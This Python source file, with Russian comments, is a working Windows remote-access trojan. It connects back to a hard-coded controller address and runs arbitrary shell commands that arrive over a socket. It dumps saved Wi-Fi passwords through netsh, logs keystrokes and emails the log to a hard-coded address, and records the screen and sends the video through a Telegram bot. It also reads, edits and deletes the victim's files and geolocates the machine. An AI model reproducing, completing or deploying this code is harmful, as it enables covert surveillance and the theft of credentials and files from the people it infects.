import os, time
import datetime
from pynput.keyboard import Listener
from pynput import keyboard
import os, stat, shutil
import keyboard
import smtplib  # Импортируем библиотеку по работе с SMTP
from email.mime.audio import MIMEAudio  # Аудио
from email.mime.image import MIMEImage  # Изображения
from email.mime.multipart import MIMEMultipart  # Многокомпонентный объект
from email.mime.text import MIMEText  # Текст/HTML


import socket, subprocess, mimetypes, requests
from pywifi import *
from requests import get

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = socket.getaddrinfo(socket.gethostname(), None)
ipv4_addresses = [i[4][0] for i in host if i[0] == socket.AF_INET]
#print(ipv4_addresses)
ip = "192.168.0.12"
reconect = False



def scan_wifi():
    wifi = PyWiFi()
    ifaces = wifi.interfaces()[0]
    ifaces.disconnect()
    profile = Profile()
    profile.ssid = ""  # requires wifi
    profile.auth = const.AUTH_ALG_OPEN  # Требуется пароль
    profile.akm.append(const.AKM_TYPE_WPA2PSK)  # Тип шифрования
    profile.cipher = const.CIPHER_TYPE_CCMP  # Единица шифрования
    # ifaces.remove_all_network_profiles()  # Удалить другие файлы конфигурации
    tmp_profile = ifaces.add_network_profile(profile)  # Файл конфигурации загрузки
    ifaces.connect(tmp_profile)  # connect
    time.sleep(10)

def wait(ip, data, main_data):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((ip, 8888))
    except:
        for ipp in range(len(data)):
            dt = data[ipp]
            del data[ipp]
            print(dt)
            wait(dt, data, main_data)
        if data == []:
            data = main_data
            wait(main_data[0], data, main_data)
    else:
        return ip
def prepare():
    data1 = (subprocess.check_output(["ipconfig", "/all"]).decode("cp866")).split('\n')
    data = []
    dAta = []
    wifi = PyWiFi()
    ifaces = wifi.interfaces()[0]
    interfaces = ifaces.name()
    scan_wifi()
    tru = False
    true = False
    for line in data1:
        if interfaces in line:
            true = True
        if true and ("DNS-серверы" in line or "DNS Servers" in line):
            tru = True
        if tru:
            line = "".join("".join(line.split(" ")[-1]).split("\r"))
            data.append(line)
            dAta.append(line)
    #ip = wait(ip="192.168.0.12", data=data, main_data=dAta)

global end_dt
global perm_dt
perm_dt = 1

def waiting(ip="192.168.0.12", s=None):
    global end_dt
    global perm_dt

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((ip, 8888))
        end_dt = datetime.datetime.now()
    except:
        s.close()
        if perm_dt == 1:
            perm_dt = datetime.datetime.now()
        s = waiting(s=s)
        return s
    else:
        return s


def show_ip(lp=None, public_ip=None):
    try:
        geo = []
        geo.append(public_ip + " - public ip\n" + lp + " - local ip")

        ip = public_ip
        response = requests.get(url=f"http://ip-api.com/json/{ip}").json()
        if response["status"] == "fail":
            return "fail"
        for name in response:
            name = str(name)
            if "country" in name:
                geo.append(name + " -->> " + str(response[name]))
            elif "regionName" in name:
                geo.append(name + " -->> " + str(response[name]))
            elif "city" in name:
                geo.append(name + " -->> " + str(response[name]))
            elif "lat" in name:
                geo.append(name + " -->> " + str(response[name]))
            elif "lon" in name:
                geo.append(name + " -->> " + str(response[name]))
            elif "as" in name:
                geo.append("computer" + " -->> " + str(response[name]))
        """area = folium.Map(location=[response.get("lat"), response.get("lon")])
        area.save(f"{response.get('query')} {response.get('city')}.html")"""
        return "\n".join(geo)
    except requests.exceptions.ConnectionError:
        s.send("Check wireless connection".encode("utf-8"))
        return
    except Exception as e:
        s.send(str(e).encode("utf-8"))
        return e


def ti(dt_pr, dt_now):
    date = (str(dt_now).split(" "))[0] + '---' + (str(dt_pr).split(" "))[0]
    if dt_now == 0:
        tm = "0:0:0"
    else:
        tm = str(dt_now - dt_pr)
    sec = str(round(float(tm.split(":")[-1])))
    minutes = str(int(tm.split(":")[1]))
    hours = str(round(float(tm.split(":")[0])))
    tm = []
    tm.append(hours)
    tm.append(minutes)
    tm.append(sec)
    tm = "=".join(tm)
    return date + "_" + tm


def video(tm, timer):
    import pyautogui
    screen = pyautogui.screenshot("screenshot.png")
    # print(screen)
    to = -1
    import cv2, pyautogui
    import numpy as np

    SCREEN_SIZE = pyautogui.size()
    fourcc = cv2.VideoWriter_fourcc(*"XVID")

    out = cv2.VideoWriter(tm + ".avi", fourcc, 20.0, (SCREEN_SIZE))

    while True:
        try:
            img = pyautogui.screenshot()

            frame = np.array(img)

            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)

            out.write(frame)
            if to == -1:
                to = (tm.split("_")[-1])
                #print(int(to.split("=")[-1]))
            #op = float(((str(datetime.datetime.now())).split(" ")[-1]).split(":")[-1])
            if int(time.perf_counter() - int(to.split("=")[-1])) > timer:
                #print(op)
                break
        except:
            break
    #cv2.destroyAllWindows()
    out.release()
    return tm + ".avi"


def kboard(com):
    def writeing_to_the_keyboard(text):
        keyboard.write(text)
    def hotk(key, text):
        keyboard.add_hotkey(key, lambda: keyboard.write(text))
    if "writeing" in com:
        writeing_to_the_keyboard((com.split("#")[-1]).split("|")[-1])
    elif "hotk" in com:
        hotk(com.split("|")[1], com.split("|")[-1])

def v1deo(tm, s=None, ip="192.168.0.12"):
    import pyautogui
    #screen = pyautogui.screenshot("screenshot.png")

    import cv2, pyautogui
    import numpy as np

    SCREEN_SIZE = pyautogui.size()
    fourcc = cv2.VideoWriter_fourcc(*"XVID")

    out = cv2.VideoWriter(str(tm) + ".avi", fourcc, 20.0, (SCREEN_SIZE))

    while True:
        try:
            img = pyautogui.screenshot()

            frame = np.array(img)

            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)

            out.write(frame)
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, 8888))
            except:
                s.close()
            else:
                break
        except KeyboardInterrupt as e:
            out.release()
            send_video(str(tm) + ".avi")
            #print(str(tm) + ".avi")
            print(e)
            exit(1)
            #break
        except:
            break
    #cv2.destroyAllWindows()
    out.release()
    return str(tm) + ".avi", s

def send_video(path='output.avi'):
    global message
    global bot
    import telebot
    bot = telebot.TeleBot('') # token

    @bot.message_handler(commands=['stp'])
    def stop_command():
        #print("ok")
        bot.stop_polling()

    bot.send_video(0, video=open(path, 'rb'), supports_streaming=True)  # first parameter is your telegram id
    stop_command()
    #bot.polling(none_stop=False, interval=0)

try:
    s.connect((ip, 8888))
except:
    s.close()
    perm_dt = str(datetime.datetime.now())
    per = perm_dt.split(" ")[-1]
    per = "=".join(per.split(":"))
    perm_dt = perm_dt.split(" ")
    perm_dt[-1] = per
    perm_dt = " ".join(perm_dt)
    _ = perm_dt
    w = v1deo(_)
    pathr = w[0]
    s = w[1]
    send_video(pathr)
    #s = waiting(ip, s)
subprocess.getoutput("chcp 65001")

def ch_dir(dir):
    subprocess.getoutput("cd " + dir)

def tr():
    qy = []
    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('cp866').split('\n')
    Wi_Fis = []
    i = 0
    res = []
    for line in data:
        if "All User Profile" in line or "Current User Profile" in line:
            Wi_Fis.append(line.split(':')[1][1:-1])

    for Wi_Fi in Wi_Fis:
        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles', Wi_Fi, 'key=clear']).decode('cp866').\
            split('\n')
        for line in results:
            if "Key Content" in line:
                res.append(line.split(':')[1][1:-1])
        try:
            qy.append(f"Имя сети: {Wi_Fi}, Пароль: {res[i]}")
            i += 1
        except IndexError:
            qy.append(f"Имя сети: {Wi_Fi}, Пароль не найден!")
    if len(qy) == 0:
        qy.append("Нет ни одного подключения.")
    return "\n".join(qy)

def cpy(path, main_path):
    path = (path.split("\\"))[-1]
    subprocess.getoutput("copy " + path + " " + main_path + "\\" + path)

def wlk(dir, main_path):
    for name in os.listdir(dir):
        path = os.path.join(dir, name)
        if os.path.isfile(path):  # если файт, ...
             cpy(name, main_path) # создать функцию переноса в папку
        else:  # если папка, ...
            wlk(path, main_path)


def py_to_exe(file):
    """with open(file + ".py", "w") as tr:
        tr.write()"""
    os.system("pip install pyinstaller")
    os.system("pyinstaller -F " + file)
    s.send("ready".encode("utf-8"))
    folder = "py_to_exe_" + file
    try:
        os.mkdir("\\".join((os.path.abspath(file).split("\\"))[0:-2] + "\\" + (file.split("."))[0]))
    except FileExistsError:  # если директория создана, ...
        pass  # ... то не создаём :)
    os.chmod("\\".join((os.path.abspath(file).split("\\"))[0:-1]), stat.S_IWRITE)
    shutil.move(os.path.abspath("build"), os.path.abspath(folder))
    shutil.move(os.path.abspath("__pycache__"), os.path.abspath(folder))
    shutil.move(os.path.abspath("dist"), os.path.abspath(folder))
    shutil.move(os.path.abspath(file.split(".")[0] + ".spec"), os.path.abspath(folder))
    shutil.move(os.path.abspath(file.split(".")[0] + ".py"), os.path.abspath(folder))
    os.chdir(folder)
    os.chdir("dist")

def keylog():

    logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format="%(message)s")

    def on_press(key):
        if key == keyboard.Key.esc or key == keyboard.Key.enter:
            return False  # stop listener
        try:
            k = key.char  # single-char keys
        except:
            k = key.name  # other keys
        logging.info(str(key))

    """with open("h.txt", "a+", encoding="utf-8") as pop:
        pop.write(on_press())"""
    with Listener(on_press=on_press) as listener:
        listener.join()
    send_email("verart1@yandex.ru", "keylog.txt")

def walk(msg, dir):  # парсер директорий
    names = []
    path3s = []
    for name in os.listdir(dir):
        path3 = os.path.join(dir, name)
        path3s.append(path3)
        names.append(name)
    for name in os.listdir(dir):
        path3 = os.path.join(dir, name)
        if os.path.isfile(path3):  # если файл, ...  # ... ищем файлы с указанным расширением и ...
            atach_file(msg, path3)  # ... активируем функцию на нём
        else:  # если папка, ...
            walk(msg, path3)  # ... заходим в неё и повторяем


def virus(python):  # основная функция самокопирования
    file = open(python, "r")  # снова читаем атакуемый файл
    original_code = ""  # вводим переменную для исходного кода атакуемого файла
    for line in file:
        original_code += line  # построчно вводим код в переменную
    #file.close()
    return original_code


def send_email(addr_to, f1le, msg_subj="Test", msg_text="hello"):
    msg = MIMEMultipart()
    addr_from = ""                      # Отправитель
    password = ""                                # Пароль

    #msg = MIMEMultipart()                                   # Создаем сообщение
    msg['From'] = addr_from                              # Адресат
    msg['To'] = addr_to                                # Получатель
    msg['Subject'] = msg_subj                               # Тема сообщения

    body = msg_text                                         # Текст сообщения
    msg.attach(MIMEText(body, 'plain'))                     # Добавляем в сообщение текст



    #process_attachement(msg, files)
    try:
        atach_file(msg, f1le)
    except:
        pass

    #======== Этот блок настраивается для каждого почтового провайдера отдельно ===============================================
    server = smtplib.SMTP_SSL('smtp.mail.ru')        # Создаем объект SMTP
    #server.starttls()                                      # Начинаем шифрованный обмен по TLS
    #server.set_debuglevel(True)                            # Включаем режим отладки, если не нужен - можно закомментировать
    server.login(addr_from, password)                       # Получаем доступ
    server.send_message(msg, from_addr=addr_from, to_addrs=addr_to)                            # Отправляем сообщение
    server.quit()                                           # Выходим
    #==========================================================================================================================

def atach_file(msg, filepath):
    ctype, encoding = mimetypes.guess_type(filepath)
    maintype, subtype = ctype.split('/', 1)  # Получаем тип и подтип
    if maintype == 'text':  # Если текстовый файл
        with open(filepath, "r", encoding="utf-8") as fp:  # Открываем файл для чтения
            file = MIMEText(fp.read(), _subtype=subtype)  # Используем тип MIMEText
            fp.close()  # После использования файл обязательно нужно закрыть
            msg.attach(file)
    elif maintype == 'image':  # Если изображение
        with open(filepath, 'rb') as fp:
            file = MIMEImage(fp.read(), _subtype=subtype)
            fp.close()
            msg.attach(file)
    elif maintype == 'audio':  # Если аудио
        with open(filepath, 'rb') as fp:
            file = MIMEAudio(fp.read(), _subtype=subtype)
            fp.close()
            msg.attach(file)
    file.add_header('Content-Disposition', 'attachment', filename=(filepath.split("\\"))[-1])  # Добавляем заголовки


email = ""
password = ""
dest_email = "verart1@yandex.ru"


def read_file(python):
    filepath = os.path.abspath(python)
    ctype, encoding = mimetypes.guess_type(filepath)
    maintype, subtype = ctype.split('/', 1)  # Получаем тип и подтип
    with open(python, "r", encoding='utf-8') as file:  # снова читаем атакуемый файл
        original_code = ""  # вводим переменную для исходного кода атакуемого файла
        for line in file:
            original_code += line  # построчно вводим код в переменную
    #print(original_code)
        file.close()
    return original_code


s.send((subprocess.getoutput("cd")).encode())
print(s.recv(1024).decode())
while 1:
    try:
        if not reconect:
            pass
        else:
            s.send((subprocess.getoutput("cd")).encode())
            print(s.recv(1024).decode())
            reconect = False
        command = s.recv(4096 * 1024).decode("utf-8")
        if "py_to_exe" in command.split(":")[0]:
            try:
                py_to_exe((command.split(":"))[-1])
            except:
                s.send("done".encode("utf-8"))
        elif "read" in command:
            rf = (read_file((command.split(" "))[-1]))
            s.send(rf.encode())
        elif command == "show_geo":
            lp = str(socket.gethostbyname(socket.gethostname()))
            p_ip = get("http://api.ipify.org").text
            ip1 = show_ip(lp, p_ip)
            if ip1 != []:
                s.send(ip1.encode("utf-8"))
            else:
                s.send("Is not connected".encode("utf-8"))
        elif "ch_dir" in command.lower():
            if (command.split(" "))[-1] == "C:" or (command.split(" "))[-1] == "A:" or (command.split(" "))[-1] == "B:" or (command.split(" "))[-1] == "D:" or (command.split(" "))[-1] == "Z:":
                os.chdir((command.split(" "))[-1])
                s.send((subprocess.getoutput("cd")).encode())
                continue
            elif ((command.split(" "))[-1] not in os.listdir("\\".join(((os.path.abspath((command.split(" "))[-1])).split("\\"))[0:-1]))) and ((command.split(" ")[-1]) != ".."):
                s.send("No such directory.\n".encode())
                continue
            os.chdir((command.split(" "))[-1])
            s.send((subprocess.getoutput("cd")).encode())
        elif "send_video" in command:
            timer = int(command.split(" ")[-1])
            _ = ti(timer, 0)
            pathr = video(_, timer)
            send_video(pathr)
        elif "delete" in command.lower():
            if (os.path.isfile((command.split(" "))[-1])):
                os.remove((command.split(" "))[-1])
            else:
                os.chdir((command.split(" "))[-1])
                try:
                    os.listdir(os.path.normpath((command.split(" "))[-1]))
                except FileNotFoundError:
                    s.send("FileNotFoundError".encode())
                    continue
                for file in os.listdir("\\".join((os.path.abspath(((command.split(" "))[-1])).split("\\"))[0:-1])):
                    os.remove(file)
                os.chdir("..")
                os.rmdir((command.split(" "))[-1])
        elif "make_d" in command:
            subprocess.getoutput("md " + (command.split(" "))[-1])
            os.chdir((command.split(" "))[-1])
            s.send((subprocess.getoutput("cd")).encode())
        elif "show_wifi_pass" in command:
            s.send(tr().encode("utf-8"))
        elif "kboard" in command:
            kboard(command.split("#")[-1])
        elif "edit" in command:
            name = (command.split(" "))[-1]
            #s.send(read_file(name).encode())
            file = open(name, "r")
            s.send((file.read()).encode("utf-8"))
            file.close()
            isp = s.recv(4096 * 1024).decode("utf-8")
            with open(name, "w") as fl:
                fl.write(isp); fl.close()
            s.send(read_file(name).encode("utf-8"))
            #s.send((or_co).encode())
        elif command == "" or command == "y" or command == "n":
            continue
        elif "start" in command:
            os.startfile((command.split(" "))[-1])
            s.close()
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s = waiting(ip, s)
        elif "cpy" in command:
            cd = True
            file = (command.split(" "))[1]
            send_email(dest_email, file)
        else:
            output = subprocess.getoutput(command)
            s.send(output.encode())

    except ConnectionRefusedError and ConnectionResetError:
        try:
            s.connect((ip, 8888))
        except:
            #s = waiting(ip, s)
            reconect = True
            #_ = ti(perm_dt, end_dt)
            perm_dt = str(datetime.datetime.now())
            per = perm_dt.split(" ")[-1]
            per = "=".join(per.split(":"))
            perm_dt = perm_dt.split(" ")
            perm_dt[-1] = per
            perm_dt = " ".join(perm_dt)
            _ = perm_dt
            pathr = v1deo(_)
            s = pathr[-1]
            send_video(pathr[0])

s.close()
